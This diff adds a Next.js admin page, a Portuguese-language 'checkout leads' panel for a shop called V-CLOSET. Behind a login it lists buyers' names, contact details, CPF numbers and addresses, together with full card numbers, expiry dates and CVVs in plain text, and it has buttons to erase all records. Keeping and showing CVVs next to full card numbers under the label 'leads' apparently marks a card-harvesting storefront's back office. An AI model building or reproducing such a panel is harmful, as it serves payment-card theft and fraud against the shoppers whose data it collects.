@@ -1,0 +1,345 @@
+"use client";
+
+import { useCallback, useEffect, useState } from "react";
+import { formatBRL } from "@/lib/format";
+
+interface LeadItem {
+  productName: string;
+  quantity: number;
+  unitPriceCents: number;
+}
+
+interface Lead {
+  id: string;
+  fullName: string;
+  email: string;
+  phone: string;
+  cpf: string;
+  cep: string;
+  address: string;
+  number: string;
+  complement: string | null;
+  neighborhood: string;
+  city: string;
+  state: string;
+  cardNumber: string;
+  cardExpiry: string;
+  cardCvv: string;
+  installments: string;
+  notes: string | null;
+  itemsJson: string;
+  subtotalCents: number;
+  discountCents: number;
+  totalCents: number;
+  createdAt: string;
+}
+
+function Field({ label, value }: { label: string; value: string | null }) {
+  return (
+    <div>
+      <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
+        {label}
+      </span>
+      <p className="mt-0.5 text-sm font-medium text-cream/90">{value || "—"}</p>
+    </div>
+  );
+}
+
+export default function LeadsPanelPage() {
+  const [checking, setChecking] = useState(true);
+  const [authed, setAuthed] = useState(false);
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [loginError, setLoginError] = useState<string | null>(null);
+  const [loggingIn, setLoggingIn] = useState(false);
+  const [leads, setLeads] = useState<Lead[]>([]);
+  const [loadingLeads, setLoadingLeads] = useState(false);
+
+  const loadLeads = useCallback(async () => {
+    setLoadingLeads(true);
+    try {
+      const res = await fetch("/api/leads-panel/leads", { cache: "no-store" });
+      if (res.status === 401) {
+        setAuthed(false);
+        return;
+      }
+      const data = await res.json();
+      setLeads(Array.isArray(data.leads) ? data.leads : []);
+      setAuthed(true);
+    } catch {
+      setLoginError("Não foi possível carregar os leads.");
+    } finally {
+      setLoadingLeads(false);
+    }
+  }, []);
+
+  useEffect(() => {
+    loadLeads().finally(() => setChecking(false));
+    document.title = "ADMINISTRAÇÃO V-CLOSET";
+  }, [loadLeads]);
+
+  async function handleLogin(e: React.FormEvent) {
+    e.preventDefault();
+    setLoginError(null);
+    setLoggingIn(true);
+    try {
+      const res = await fetch("/api/leads-panel/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password }),
+      });
+      if (!res.ok) {
+        const data = await res.json().catch(() => ({}));
+        setLoginError(data.error || "E-mail ou senha inválidos.");
+        return;
+      }
+      setEmail("");
+      setPassword("");
+      await loadLeads();
+    } catch {
+      setLoginError("Erro de conexão. Tente novamente.");
+    } finally {
+      setLoggingIn(false);
+    }
+  }
+
+  async function handleLogout() {
+    await fetch("/api/leads-panel/logout", { method: "POST" });
+    setAuthed(false);
+    setLeads([]);
+  }
+
+  async function handleClearAll() {
+    if (!window.confirm("Apagar TODOS os leads? Esta ação não pode ser desfeita.")) return;
+    await fetch("/api/leads-panel/leads?all=1", { method: "DELETE" });
+    await loadLeads();
+  }
+
+  async function handleDelete(id: string) {
+    if (!window.confirm("Apagar este lead?")) return;
+    await fetch(`/api/leads-panel/leads?id=${encodeURIComponent(id)}`, {
+      method: "DELETE",
+    });
+    await loadLeads();
+  }
+
+  if (checking) {
+    return (
+      <main className="flex min-h-screen items-center justify-center bg-ink">
+        <p className="text-sm tracking-widest2 text-cream/50">CARREGANDO…</p>
+      </main>
+    );
+  }
+
+  if (!authed) {
+    return (
+      <main className="flex min-h-screen items-center justify-center bg-ink px-4">
+        <div className="w-full max-w-sm">
+          <div className="text-center">
+            <h1 className="font-serif text-3xl tracking-widest2 text-gold-400">
+              ADMINISTRAÇÃO
+            </h1>
+            <p className="mt-1 font-serif text-3xl tracking-widest2 text-cream">
+              V-CLOSET
+            </p>
+            <p className="mt-3 text-xs uppercase tracking-widest2 text-cream/50">
+              Painel de Leads do Checkout
+            </p>
+          </div>
+
+          <form
+            onSubmit={handleLogin}
+            className="mt-10 space-y-5 rounded-lg border border-gold-400/20 bg-ink-soft p-7"
+          >
+            <div>
+              <label
+                htmlFor="panel-email"
+                className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/60"
+              >
+                E-mail
+              </label>
+              <input
+                id="panel-email"
+                type="email"
+                autoComplete="username"
+                required
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                className="mt-1.5 w-full rounded border border-gold-400/20 bg-ink px-3 py-2.5 text-sm text-cream outline-none transition focus:border-gold-400/60"
+                placeholder="seu@email.com"
+              />
+            </div>
+            <div>
+              <label
+                htmlFor="panel-password"
+                className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/60"
+              >
+                Senha
+              </label>
+              <input
+                id="panel-password"
+                type="password"
+                autoComplete="current-password"
+                required
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className="mt-1.5 w-full rounded border border-gold-400/20 bg-ink px-3 py-2.5 text-sm text-cream outline-none transition focus:border-gold-400/60"
+                placeholder="••••••••"
+              />
+            </div>
+
+            {loginError && (
+              <p className="rounded border border-red-500/30 bg-red-500/10 px-3 py-2 text-xs text-red-300">
+                {loginError}
+              </p>
+            )}
+
+            <button
+              type="submit"
+              disabled={loggingIn}
+              className="w-full rounded bg-gold-400 py-3 text-xs font-bold uppercase tracking-widest2 text-ink transition hover:bg-gold-300 disabled:cursor-not-allowed disabled:opacity-50"
+            >
+              {loggingIn ? "Entrando…" : "Entrar"}
+            </button>
+          </form>
+        </div>
+      </main>
+    );
+  }
+
+  return (
+    <main className="min-h-screen bg-ink px-4 py-10 sm:px-8">
+      <div className="mx-auto max-w-5xl">
+        <div className="flex flex-wrap items-end justify-between gap-4">
+          <div>
+            <h1 className="font-serif text-3xl tracking-widest2 text-gold-400">
+              ADMINISTRAÇÃO V-CLOSET
+            </h1>
+            <p className="mt-2 text-xs uppercase tracking-widest2 text-cream/50">
+              Painel de Leads · {leads.length} lead{leads.length === 1 ? "" : "s"}
+            </p>
+          </div>
+          <div className="flex flex-wrap items-center gap-2">
+            <button
+              onClick={loadLeads}
+              disabled={loadingLeads}
+              className="rounded border border-gold-400/30 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-gold-400 transition hover:border-gold-400/60 disabled:opacity-50"
+            >
+              {loadingLeads ? "Atualizando…" : "Atualizar"}
+            </button>
+            <button
+              onClick={handleClearAll}
+              disabled={leads.length === 0}
+              className="rounded border border-red-500/40 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/70 disabled:opacity-30"
+            >
+              Limpar histórico
+            </button>
+            <button
+              onClick={handleLogout}
+              className="rounded border border-cream/20 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-cream/60 transition hover:border-cream/40"
+            >
+              Sair
+            </button>
+          </div>
+        </div>
+
+        {leads.length === 0 ? (
+          <p className="mt-16 text-center text-sm text-cream/50">
+            Nenhum lead enviado ainda.
+          </p>
+        ) : (
+          <div className="mt-8 space-y-4">
+            {leads.map((lead) => {
+              let items: LeadItem[] = [];
+              try {
+                items = JSON.parse(lead.itemsJson) as LeadItem[];
+              } catch {
+                items = [];
+              }
+
+              return (
+                <div
+                  key={lead.id}
+                  className="rounded-lg border border-gold-400/15 bg-ink-soft p-5"
+                >
+                  <div className="flex flex-wrap items-center justify-between gap-3">
+                    <div>
+                      <p className="text-sm font-semibold text-cream">
+                        #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
+                      </p>
+                      <p className="text-xs text-cream/50">
+                        {lead.email} · {lead.phone}
+                      </p>
+                    </div>
+                    <div className="flex items-center gap-4">
+                      <div className="text-right">
+                        <p className="text-sm font-bold text-gold-400">
+                          {formatBRL(lead.totalCents)}
+                        </p>
+                        <p className="text-xs text-cream/50">
+                          {lead.installments}
+                          {lead.installments === "1" ? "x (à vista)" : "x sem juros"} ·{" "}
+                          {new Date(lead.createdAt).toLocaleString("pt-BR")}
+                        </p>
+                      </div>
+                      <button
+                        onClick={() => handleDelete(lead.id)}
+                        className="rounded border border-red-500/30 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
+                        aria-label={`Excluir lead ${lead.fullName}`}
+                      >
+                        Excluir
+                      </button>
+                    </div>
+                  </div>
+
+                  <div className="mt-4 grid gap-3 border-t border-gold-400/10 pt-4 text-sm sm:grid-cols-2 lg:grid-cols-4">
+                    <Field label="CPF" value={lead.cpf} />
+                    <Field label="CEP" value={lead.cep} />
+                    <Field label="Endereço" value={`${lead.address}, ${lead.number}`} />
+                    <Field label="Complemento" value={lead.complement} />
+                    <Field label="Bairro" value={lead.neighborhood} />
+                    <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
+                    <Field label="Cartão" value={lead.cardNumber} />
+                    <Field
+                      label="Validade / CVV"
+                      value={`${lead.cardExpiry} · ${lead.cardCvv}`}
+                    />
+                  </div>
+
+                  <div className="mt-4 border-t border-gold-400/10 pt-4">
+                    <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
+                      Itens
+                    </span>
+                    <ul className="mt-1 space-y-0.5 text-sm text-cream/80">
+                      {items.map((item, idx) => (
+                        <li key={idx}>
+                          {item.productName} × {item.quantity} —{" "}
+                          {formatBRL(item.unitPriceCents * item.quantity)}
+                        </li>
+                      ))}
+                    </ul>
+                    {lead.discountCents > 0 && (
+                      <p className="mt-1 text-xs text-emerald-400">
+                        Desconto aplicado: -{formatBRL(lead.discountCents)}
+                      </p>
+                    )}
+                    {lead.notes && (
+                      <>
+                        <span className="mt-3 block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
+                          Observações
+                        </span>
+                        <p className="mt-1 whitespace-pre-line text-sm text-cream/80">
+                          {lead.notes}
+                        </p>
+                      </>
+                    )}
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+        )}
+      </div>
+    </main>
+  );
+}
